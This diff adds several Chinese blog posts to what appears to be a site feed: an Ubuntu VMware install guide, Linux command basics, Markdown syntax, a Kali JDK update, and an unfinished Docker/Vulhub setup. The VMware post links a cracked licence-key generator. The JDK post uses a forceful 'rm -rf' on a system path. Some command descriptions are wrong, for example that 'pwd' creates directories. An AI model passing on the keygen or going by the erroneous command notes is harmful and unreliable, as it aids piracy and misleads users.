+    <content><![CDATA[<div class="note info no-icon"><h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>Ubuntu 和 Windows 有何不同？<br>从大的方面讲，它们的设计理念不同，借用一位前辈的话：“Windows为不知道自己正在做什么的人设计，Linux为知道自己要做什么，正在做什么的人设计”。<br>从小的方面讲，用户体验不同。Windows 将机器置于一个和人对等的位置，它会对你提出要求，让你跟着它去做。Linux将机器置于服务于人的位置，它是一台服务于你的机器，听你指挥，接受你的配置，适当时候会提示你，但绝不会命令你。<br>刚开始从Windows到Ubuntu，肯定会不习惯，但是当你熟悉了这些操作，你会发现这是更高效的方法，这是另一种体验，你发号施令，让机器为你而运转，你会体验到机器服务于人的设计理念。在熟悉Ubuntu之后，我相信，你也会喜欢上这个简洁而优雅的开源世界。</p>
+</div>
+
+
+<hr>
+<h1 id="1-镜像下载及相关知识"><a href="#1-镜像下载及相关知识" class="headerlink" title="1. 镜像下载及相关知识"></a>1. 镜像下载及相关知识</h1><h2 id="1-1-镜像下载地址"><a href="#1-1-镜像下载地址" class="headerlink" title="1.1 镜像下载地址"></a>1.1 镜像下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jbi51YnVudHUuY29tL2Rvd25sb2Fk">Ubuntu官网下载地址<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLw==">阿里云镜像站<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="1-2-各版本介绍"><a href="#1-2-各版本介绍" class="headerlink" title="1.2 各版本介绍"></a>1.2 各版本介绍</h2><div class="note info no-icon"><p>桌面版：即日常使用版本，带有GUI(图形化界面)，为个人电脑所配置。<br>服务器版：适用于web服务器，没有GUI，但包含了所有你需要启动托管站点的软件，即LAMP(Linux、Apache、MySQL和PHP)。<br>物联网版：即Ubuntu Core，适用于边缘计算和大型设备网络。</p>
+</div>
+
+<p>博主使用的从阿里云镜像站下载的<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLzIwLjA0L3VidW50dS0yMC4wNC1iZXRhLWRlc2t0b3AtYW1kNjQuaXNv">ubuntu-20.04-beta-desktop-amd64<i class="fa fa-external-link-alt"></i></span>版本</p>
+<h1 id="2-虚拟机配置"><a href="#2-虚拟机配置" class="headerlink" title="2. 虚拟机配置"></a>2. 虚拟机配置</h1><h2 id="2-1-VMware-Workstation-Pro下载"><a href="#2-1-VMware-Workstation-Pro下载" class="headerlink" title="2.1 VMware Workstation Pro下载"></a>2.1 VMware Workstation Pro下载</h2><div class="note info no-icon"><p>官网下载的15.5.0版本，外加上不记得哪儿撸的许可证生成工具<br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUJkVnBLNlpNajkzd0ktVkdCUkVlTWc=">百度网盘<i class="fa fa-external-link-alt"></i></span> 提取码：3vpv</p>
+</div>
+
+<h2 id="2-2-虚拟机创建及配置"><a href="#2-2-虚拟机创建及配置" class="headerlink" title="2.2 虚拟机创建及配置"></a>2.2 虚拟机创建及配置</h2><h3 id="①-创建新的虚拟机-典型-稍后安装操作系统"><a href="#①-创建新的虚拟机-典型-稍后安装操作系统" class="headerlink" title="① 创建新的虚拟机 - 典型 - 稍后安装操作系统"></a>① 创建新的虚拟机 - 典型 - 稍后安装操作系统</h3>
+
+<h3 id="②-虚拟机配置"><a href="#②-虚拟机配置" class="headerlink" title="② 虚拟机配置"></a>② 虚拟机配置</h3><p>指定系统版本为 Ubuntu 64位</p>
+
+
+<p>自定义虚拟机名称和存放位置</p>
+
+
+<p>磁盘分配60g足矣</p>
+
+
+<p>接着来到自定义硬件</p>
+
+
+<p>点开自定义硬件，选中<code>新CD/DVD(SATA)</code>选项，在这里导入我们下载好的ISO文件<br>ps：可以将无用硬件移除以提升系统运行效率，例如打印机、声卡等，运行内存至少分配2g，处理器核心数自定</p>
+
+
+
+<h1 id="3-系统安装及配置"><a href="#3-系统安装及配置" class="headerlink" title="3. 系统安装及配置"></a>3. 系统安装及配置</h1><h2 id="3-1-系统安装"><a href="#3-1-系统安装" class="headerlink" title="3.1 系统安装"></a>3.1 系统安装</h2><h3 id="1-进入安装界面"><a href="#1-进入安装界面" class="headerlink" title="1. 进入安装界面"></a>1. 进入安装界面</h3><p>开机会先进行磁盘检测，稍等即刻，然后来到安装界面，拉到最下面选择中文(简体)并安装Ubuntu</p>
+
+<p>键盘布局保持默认直接下一步</p>
+<h3 id="2-更新和其他软件"><a href="#2-更新和其他软件" class="headerlink" title="2. 更新和其他软件"></a>2. 更新和其他软件</h3><p>取消勾选<code>安装Ubuntu时下载更新</code></p>
+
+
+<h3 id="3-安装类型"><a href="#3-安装类型" class="headerlink" title="3. 安装类型"></a>3. 安装类型</h3><p>保持默认选项，点击<code>现在安装</code></p>
+
+
+<h3 id="4-将改动写入磁盘"><a href="#4-将改动写入磁盘" class="headerlink" title="4. 将改动写入磁盘"></a>4. 将改动写入磁盘</h3>
+
+<h3 id="5-选择时区"><a href="#5-选择时区" class="headerlink" title="5. 选择时区"></a>5. 选择时区</h3>
+
+<h3 id="6-设置用户名和密码"><a href="#6-设置用户名和密码" class="headerlink" title="6. 设置用户名和密码"></a>6. 设置用户名和密码</h3>
+
+<h3 id="7-开始安装系统"><a href="#7-开始安装系统" class="headerlink" title="7. 开始安装系统"></a>7. 开始安装系统</h3><p>到这里可以去抽根烟喝口茶，静待安装程序结束</p>
+
+<p>ps：过程中会出现<code>正在下载语言包</code>或者<code>软件包</code>的字样，因为没有配置国内源，所以会很慢，这里我们可以点开三角形图标有个skip，点击即可跳过下载</p>
+
+
+<p>安装完点击现在重启会出现如下报错</p>
+
+<p>我们只需要关闭虚拟机，在<code>CD/DVD(SATA)</code>中取消启动时连接，再开机即可正常进入系统</p>
+
+
+
+<h2 id="3-2-系统配置"><a href="#3-2-系统配置" class="headerlink" title="3.2 系统配置"></a>3.2 系统配置</h2><h3 id="1-安装VMware-Tools"><a href="#1-安装VMware-Tools" class="headerlink" title="1. 安装VMware Tools"></a>1. 安装VMware Tools</h3><p>有了它你才能将主机文件直接复制粘贴到虚拟机上，同时窗口尺寸也可以自适应了</p>
+<ul>
+<li><p>菜单栏 虚拟机 - 安装VMware Tools</p>
+</li>
+<li><p>会有一个弹窗，点击即可打开文件夹，将挂载的VMware Tools中的压缩包拷贝到Ubuntu本地，比如桌面，并解压</p>
+</li>
+<li><p>进入解压出来的文件夹，右键空白处选择在此处打开终端</p>
+</li>
+<li><p>开始安装VMware Tools，键入命令后回车执行，第一个问题需要键入<code>yes</code>进行确认，之后一路回车，出现 <code>Enjoy</code> 字样即安装成功，重启生效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h3><ul>
+<li><p>打开软件更新器，稍等一会儿，进入设置-Ubuntu软件，勾选源代码，之后就可以自由选择软件源了</p>
+
+</li>
+<li><p>这里我选择阿里的源，地区不同，不同的源效果也不同，可以点击选择最佳服务器让系统自行测速之后选择最佳的</p>
+</li>
+<li><p>关闭之后点击立即安装，开始系统安装后的第一次更新</p>
+</li>
+</ul>
+<p>整个安装过程就这些，有问题请在下方留言</p>
+]]></content>
+      <categories>
+        <category>嵌入式开发</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux基础知识</title>
+    <url>/archives/29244.html</url>
+    <content><![CDATA[<h1 id="0x01-常见shell命令"><a href="#0x01-常见shell命令" class="headerlink" title="0x01 常见shell命令"></a>0x01 常见shell命令</h1><ul>
+<li><code>ls</code>：显示文件的目录和信息（ls -l 显示文件属性，包括大小，日期，符号连接，是否可读写及是否可执行）<br><code>cd</code>：进入目录，改名目录<br><code>pwd</code>：创建删除目录<br><code>cp</code>：copy文件<br><code>rm</code>：删除文件或者目录<br><code>mv</code>：移动文件或目录<br><code>cat</code>：显示文件的内容，和DOS的type相同<br><code>touch</code>：创建一个新文件<br><code>ln</code>:用于将一个文件创建链接,链接分为软链接(类似于windows系统中的快捷方式)和硬链接(相当于对源文件copy,程序或命令对该文件block的另一个访问路口)，命令默认使用硬链接。</li>
+<li>关机命令：<br>  shutdown命令<br>  语法格式：<code>shutdown [选项] [时间] [警告信息]</code><br>  该命令中各选项的含义说明：<blockquote>
+<p>-k：只发出警告信息给用户<br>  -r：关闭系统后重启系统<br>  -h：关闭系统后不重启系统<br>  -f：快速关闭系统，重启系统时不进行磁盘检测<br>  -n：快速关闭系统，但是不经过init程序关闭<br>  -c：中断关闭系统</p>
+</blockquote>
+</li>
+<li>Linux文件的基本属性<code>ls -Linux</code></li>
+<li>tty1-7快捷键切换<code>ctrl+alt+（f1-f7）</code>（f7为图形化界面)</li>
+</ul>
+<h1 id="0x02-chroot命令"><a href="#0x02-chroot命令" class="headerlink" title="0x02 chroot命令"></a>0x02 chroot命令</h1><p>语法<code>chroot [选项] [参数]</code></p>
+<blockquote>
+<p>好处</p>
+<ul>
+<li>增加了系统的安全性限制了用户的权力：<br>在经过chroot之后，在新根下将访问不到旧系统的根目录和文件，这样就增强了系统的安全性。这个一般是在登陆前使用chroot，以此达到用户不能访问一些特定的文件。</li>
+<li>建立一个与原系统隔离的系统目录结构，方便用户的开发：<br>这一个与原系统根下文件不相关的目录结构。在这个新环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。</li>
+<li>切换系统的根目录的位置，引导Linux系统启动以及急救系统等：<br>chroot的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始RAM磁盘（initrd）切换系统的根位置并执行真正的init。另外，当系统出现一些问题时，我们也可以使用chroot来切换到一个临时的系统。</li>
+</ul>
+</blockquote>
+<h1 id="0x03-Linux的目录结构"><a href="#0x03-Linux的目录结构" class="headerlink" title="0x03 Linux的目录结构"></a>0x03 Linux的目录结构</h1><ul>
+<li>/<br>根目录，一般根目录下只存放目录，不要存放文件。/etc、/bin、/dev、/lib、/sbin应该和根目录放置在一个分区中</li>
+<li>/bin<br>存放系统中最常用的二进制可执行文件（二进制文件）。基础系统所需要的那些命令位于此目录，也是最小系统所需要的命令；例如ls、cp、mkdir等命令。功能和/usr/bin类似，这个目录中的文件都是可执行的，普通用户都可以使用命令</li>
+<li>/boot<br>存放Linux内核和系统启动文件，包括Grub、lilo启动程序</li>
+<li>/dev<br>存放所有设备文件，包括硬盘、分区、键盘、鼠标、USB等</li>
+<li>/etc<br>存放系统所有配置文件，例如passwd存放用户账户信息，hostname存放主机名等。/etc/fstab是开机自动挂载一些分区的，在里面写入一些分区信息，就能实现开机挂载分区</li>
+<li>/home<br>用户目录的默认位置</li>
+<li>/initrd<br>存放启动时挂载initrd.img映像文件的目录，以及载入所需设备模块的目录</li>
+<li>/lib<br>存放共享的库文件，包含许多被/bin和/sbin中程序使用的库文件</li>
+<li>/lost+found<br>在ext2或者ext3文件系统中，当系统意外崩溃或者计算机意外关机，而产生一些文件碎片存放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。有时系统发生问题，有很多的文件被移动到这个目录中，可能会用手工的方式来修复或移动到文件的原位置上</li>
+<li>/media<br>即插即用型设备的挂载点自动在这个目录下创建。例如USB自动挂载后会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，存放临时读入的文件</li>
+<li>/mnt<br>此目录通常用于作为被挂载的文件系统的挂载点</li>
+<li>/proc<br>存放所有标志为文件的进程，它们是通过进程号或其他的系统动态信息进行标识。例如CPU、硬盘分区、内存信息等存放在这里</li>
+<li>/opt<br>作为可选文件和程序的存放目录。有些软件包也会被安装在这里，也就是自定义软件包；有些用户自己编译的软件包，就可以安装在这个目录中</li>
+<li>/root<br>根用户（超级用户）的主目录</li>
+<li>/sbin<br>大多是涉及系统管理的命令的存放地，也是超级权限用户root的可执行命令存放地。普通用户无权限执行这个目录下的命令，这个目录和/usr/sbin; /usr/X11R6/sbin或/usr/local/sbin目录是相似的。注意，凡是目录sbin中包含的都是root权限才能执行的</li>
+<li>/srv<br>存放系统所提供的服务数据</li>
+<li>/sys<br>该目录用于将系统设备组织或层次结构，并向用户提供详细的内核数据信息</li>
+<li>/tmp<br>临时文件目录，有时用户运行程序的时候，会产生临时文件。/var/tmp目录和这个目录相似</li>
+<li>/usr<br>用于存放与系统用户直接有关的文件和目录，如应用程序及支出系统的库文件</li>
+</ul>
+<h1 id="0x04-Linux忘记密码的解决办法"><a href="#0x04-Linux忘记密码的解决办法" class="headerlink" title="0x04 Linux忘记密码的解决办法"></a>0x04 Linux忘记密码的解决办法</h1><ol>
+<li>进入“恢复模式”并编辑</li>
+<li>更改代码（ro-&gt;rw,添加init=/bin/bash）</li>
+<li>重置密码</li>
+<li>重启系统<br>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RlbGVnZXIvYXJ0aWNsZS9kZXRhaWxzLzEwNDQwODQ3NQ==">Ubuntu忘记密码的解决方法<i class="fa fa-external-link-alt"></i></span></li>
+</ol>
+<h1 id="0x05-ssh服务"><a href="#0x05-ssh服务" class="headerlink" title="0x05 ssh服务"></a>0x05 ssh服务</h1><p><strong>ssh远程登录</strong></p>
+<ol>
+<li>口令登录：ssh user@host（以用户名user，登录远程主机host）<br>如果本地用户名和远程的用户名一致，用户名可以省略。<br>ssh的默认端口是22，可以使用p参数来修改这个端口。（如：ssh -p 44 user@host）</li>
+<li>公钥登录：<br>ssh公钥登录可以省去输入密码的步骤<br>原理：将自己的公钥储存在远程主机上登陆的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码。（用户必须提供自己的公钥。若没有直接用ssh-keygen生成一个）</li>
+</ol>
+<h1 id="0x06-IP命令"><a href="#0x06-IP命令" class="headerlink" title="0x06 IP命令"></a>0x06 IP命令</h1><p>对于网络管理员们和所有的Linux使用者们，ip命令是必备工具，是时候抛弃ifconfig命令了，特别是当你写脚本时。</p>
+<ul>
+<li>查看本机IP<br>ip a</li>
+<li>给机器设置及删除一个IP地址<br>ip addr add（del） （IP地址）</li>
+<li>监控netlink消息<br>ip monitor all<br>[ip命令参考文章]<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXN1d2FuZ3FpYW5nL3AvMTE1Mjc2MTkuaHRtbA==">https://www.cnblogs.com/ysuwangqiang/p/11527619.html<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><span class="exturl" data-url="aHR0cDovL21hbi5saW51eGRlLm5ldC8=">Linux命令大全<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+      <categories>
+        <category>嵌入式开发</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Markdown语法学习</title>
+    <url>/archives/3969.html</url>
+    <content><![CDATA[<h1 id="一-标题"><a href="#一-标题" class="headerlink" title="一.标题"></a>一.标题</h1><p>  1.使用 = 和 - 标记一级和二级标题<br>  = 和 - 标记语法格式如下：</p>
+<blockquote>
+<p>我展示的是一级标题<br>===<br>我展示的是二级标题<br>---</p>
+</blockquote>
+<blockquote>
+<p>显示效果：</p>
+<h1 id="我展示的是一级标题"><a href="#我展示的是一级标题" class="headerlink" title="我展示的是一级标题"></a>我展示的是一级标题</h1><h2 id="我展示的是二级标题"><a href="#我展示的是二级标题" class="headerlink" title="我展示的是二级标题"></a>我展示的是二级标题</h2></blockquote>
+<p>  2.使用 # 号标记<br>    使用 # 号可表示 1-6 级标题，一级标题对应一个 # 号，二级标题对应两个 # 号，以此类推</p>
+<blockquote>
+<p># 一级标题<br>## 二级标题<br>### 三级标题<br>#### 四级标题<br>##### 五级标题<br>###### 六级标题</p>
+</blockquote>
+<blockquote>
+<p>显示效果：</p>
+<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6></blockquote>
+<h1 id="二-列表"><a href="#二-列表" class="headerlink" title="二.列表"></a>二.列表</h1><h2 id="1-无序"><a href="#1-无序" class="headerlink" title="1.无序"></a>1.无序</h2><blockquote>
+<p>用 *、+、- </p>
+<ul>
+<li>这个点就是效果</li>
+</ul>
+</blockquote>
+<h2 id="2-有序"><a href="#2-有序" class="headerlink" title="2.有序"></a>2.有序</h2><blockquote>
+<ol>
+<li>一</li>
+<li>二</li>
+<li>三</li>
+</ol>
+</blockquote>
+<h1 id="三-区块引用"><a href="#三-区块引用" class="headerlink" title="三.区块引用"></a>三.区块引用</h1><ul>
+<li>举例<br>&gt; 如此<blockquote>
+<p>如此</p>
+</blockquote>
+<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2>&gt; 一级<br>&gt;&gt; 二级<br>&gt;&gt;&gt; 三级<br>显示效果：<blockquote>
+<p>一级</p>
+<blockquote>
+<p>二级</p>
+<blockquote>
+<p>三级</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>……</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<h1 id="四-分割线"><a href="#四-分割线" class="headerlink" title="四.分割线"></a>四.分割线</h1><blockquote>
+<p>***<br> ---<br> ___<br> 显示效果：</p>
+<hr>
+</blockquote>
+<h1 id="五-链接"><a href="#五-链接" class="headerlink" title="五.链接"></a>五.链接</h1><p>支持2种链接方式：行内式和参数式，不管是哪一种，链接文字都是用 [方括号] 来标记记</p>
+<blockquote>
+<p>[百度一下](<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==">https://www.baidu.com<i class="fa fa-external-link-alt"></i></span>)<br>显示效果：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==">百度一下<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<h1 id="六-图片"><a href="#六-图片" class="headerlink" title="六.图片"></a>六.图片</h1><ul>
+<li>用法跟链接的基本一样，也是行内式和参数式，唯一的不同就是图片链接前面要写一个<code>!</code></li>
+</ul>
+<h1 id="七-代码框"><a href="#七-代码框" class="headerlink" title="七.代码框"></a>七.代码框</h1><ul>
+<li><p>单行用 单反引号 </p>
+<blockquote>
+<p>`apt-get upgrade`<br>显示效果<br><code>apt-get upgrade</code></p>
+</blockquote>
+</li>
+<li><p>多行用三个单反引号</p>
+<blockquote>
+<p>```<br>  apt-get upgrade<br>  ls<br>  cd<br>  ```<br>显示效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br><span class="line">ls</span><br><span class="line">cd</span><br></pre></td></tr></table></figure></blockquote>
+</li>
+</ul>
+<h1 id="八-表格"><a href="#八-表格" class="headerlink" title="八.表格"></a>八.表格</h1><blockquote>
+<p>表头1|表头2|表头3<br>-|-|-<br>内容1|内容2|内容3</p>
+</blockquote>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>表头1</th>
+<th>表头2</th>
+<th>表头3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内容1</td>
+<td>内容2</td>
+<td>内容3</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h1 id="九-强调"><a href="#九-强调" class="headerlink" title="九.强调"></a>九.强调</h1><blockquote>
+<p>*字体倾斜*<br>显示效果：<br><em>字体倾斜</em></p>
+</blockquote>
+<blockquote>
+<p>_字体倾斜_<br>显示效果：<br><em>字体倾斜</em></p>
+</blockquote>
+<blockquote>
+<p>**字体加粗**<br>显示效果：<br><strong>字体加粗</strong></p>
+</blockquote>
+<blockquote>
+<p>__字体加粗__<br>显示效果：<br><strong>字体加粗</strong></p>
+</blockquote>
+<blockquote>
+<p>***粗斜体文本***<br>显示效果：<br><em><strong>粗斜体文本</strong></em></p>
+</blockquote>
+<blockquote>
+<p>___粗斜体文本___<br>显示效果：<br><em><strong>粗斜体文本</strong></em></p>
+</blockquote>
+<h1 id="十-转义"><a href="#十-转义" class="headerlink" title="十.转义"></a>十.转义</h1><p>  在需要转义的符号前加上\即可</p>
+<blockquote>
+<p>如：\*<br>显示效果 *</p>
+</blockquote>
+<h1 id="十一-删除线"><a href="#十一-删除线" class="headerlink" title="十一.删除线"></a>十一.删除线</h1><p>~~再见~~</p>
+<blockquote>
+<p>显示效果：<br><del>再见</del></p>
+</blockquote>
+<h1 id="十二-下划线"><a href="#十二-下划线" class="headerlink" title="十二.下划线"></a>十二.下划线</h1><p>&lt;u&gt;带下划线文本&lt;/u&gt;</p>
+<blockquote>
+<p>显示效果：<br><u>带下划线文本</u></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>基础</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali更新jdk-8u251</title>
+    <url>/archives/9111.html</url>
+    <content><![CDATA[<div class="note info no-icon"><h1 id="为啥突然写这篇文章？"><a href="#为啥突然写这篇文章？" class="headerlink" title="为啥突然写这篇文章？"></a>为啥突然写这篇文章？</h1><p>今天打开尘封已久的 Burpsuite 时给我来了个弹窗，如下图</p>
+<p>根据博主的英语水平我jio的它说的是：你的jre版本我们(burp)没有测试过，你用的时候阔能会出毛病。<br>emmm，然后事实证明确实出了毛病，使用的时候发现端口监听勾不上了</p>
+</div>
+<p>第一时间当然是查看当前的java版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
+<p>然后发现丫的我就没见过这版本号</p>
+
+<p>后来查了一下啥是OpenJDK，得到了这篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80NDFhYTFhOTc2YjM=">OpenJDK与JDK的区别分析<i class="fa fa-external-link-alt"></i></span></p>
+<p>话不多说，上正题</p>
+<h1 id="1-卸载原装jdk"><a href="#1-卸载原装jdk" class="headerlink" title="1. 卸载原装jdk"></a>1. 卸载原装jdk</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which java  #查看JDK的安装路径</span><br><span class="line">sudo rm -rf /usr/bin/java   # 这里的路径即为上一条命令返回的路径，自行修改</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-下载JDK"><a href="#2-下载JDK" class="headerlink" title="2. 下载JDK"></a>2. 下载JDK</h1><ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtamRrOC1kb3dubG9hZHMuaHRtbA==">Oracle官方下载地址<i class="fa fa-external-link-alt"></i></span><br>ps: 下载<code>Linux x64 Compressed Archive</code>这个版本，好像需要注册帐号，登录才能下载</p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXBLZXVVV1Rjb1dPWEJTOHUwVXhfUkE=">百度网盘<i class="fa fa-external-link-alt"></i></span><br>提取码：iouq<br>我也想用蓝奏云，无奈这个包186m，上传超过100m的文件要充钱，我的钱拿去百度网盘自动续费了。。。</p>
+</li>
+</ul>
+<h1 id="3-建立目录并解压文件"><a href="#3-建立目录并解压文件" class="headerlink" title="3. 建立目录并解压文件"></a>3. 建立目录并解压文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /usr/local/java</span><br><span class="line">sudo cp jdk-8u251-linux-x64.tar.gz /usr/local/java</span><br><span class="line">cd /usr/local/java</span><br><span class="line">sudo tar xzvf jdk-8u251-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-配置环境变量"><a href="#4-配置环境变量" class="headerlink" title="4. 配置环境变量"></a>4. 配置环境变量</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mousepad /etc/profile</span><br><span class="line"># 复制以下代码到文件结尾</span><br><span class="line">JAVA_HOME=/usr/local/java/jdk1.8.0_251</span><br><span class="line">PATH=$PATH:$HOME/bin:$JAVA_HOME/bin</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-告诉系统Java的位置"><a href="#5-告诉系统Java的位置" class="headerlink" title="5. 告诉系统Java的位置"></a>5. 告诉系统Java的位置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/local/java/jdk1.8.0_251/bin/java&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;/usr/bin/javac&quot; &quot;javac&quot; &quot;/usr/local/java/jdk1.8.0_251/bin/javac&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/local/java/jdk1.8.0_251/bin/javaws&quot; 1</span><br></pre></td></tr></table></figure>
+
+<h1 id="6-设置为默认JDK"><a href="#6-设置为默认JDK" class="headerlink" title="6. 设置为默认JDK"></a>6. 设置为默认JDK</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set java /usr/local/java/jdk1.8.0_251/bin/java</span><br><span class="line">sudo update-alternatives --set javac /usr/local/java/jdk1.8.0_251/bin/javac</span><br><span class="line">sudo update-alternatives --set javaws /usr/local/java/jdk1.8.0_251/bin/javaws</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-重新载入profile"><a href="#7-重新载入profile" class="headerlink" title="7. 重新载入profile"></a>7. 重新载入profile</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
+
+<h1 id="8-验证是否安装成功"><a href="#8-验证是否安装成功" class="headerlink" title="8. 验证是否安装成功"></a>8. 验证是否安装成功</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
+
+
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy81MTkyNjQzMA==">kali（ubuntu）linux Oracle jdk 8安装<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>Kali Linux</tag>
+        <tag>jdk</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装Docker并配置Vulhub</title>
+    <url>/archives/60505.html</url>
+    <content><![CDATA[<h1 id="一、安装Docker"><a href="#一、安装Docker" class="headerlink" title="一、安装Docker"></a>一、安装Docker</h1><h2 id="1-卸载旧版本Docker"><a href="#1-卸载旧版本Docker" class="headerlink" title="1. 卸载旧版本Docker"></a>1. 卸载旧版本Docker</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h2><h3 id="2-1-更新软件源并安装依赖包"><a href="#2-1-更新软件源并安装依赖包" class="headerlink" title="2.1 更新软件源并安装依赖包"></a>2.1 更新软件源并安装依赖包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install \</span><br><span class="line">apt-transport-https \</span><br><span class="line">ca-certificates \</span><br><span class="line">curl \</span><br><span class="line">gnupg-agent \</span><br><span class="line">software-properties-common</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-添加Docker官方软件包密钥"><a href="#2-2-添加Docker官方软件包密钥" class="headerlink" title="2.2 添加Docker官方软件包密钥"></a>2.2 添加Docker官方软件包密钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
+
+<p>验证密钥是否安装成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key fingerprint 0EBFCD88</span><br><span class="line"></span><br><span class="line">pub   4096R/0EBFCD88 2017-02-22</span><br><span class="line">      Key fingerprint = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R/F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-添加软件源"><a href="#2-3-添加软件源" class="headerlink" title="2.3 添加软件源"></a>2.3 添加软件源</h3><p>查询当前系统所基于的Debian版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+<p>得到如图反馈</p>
+
+
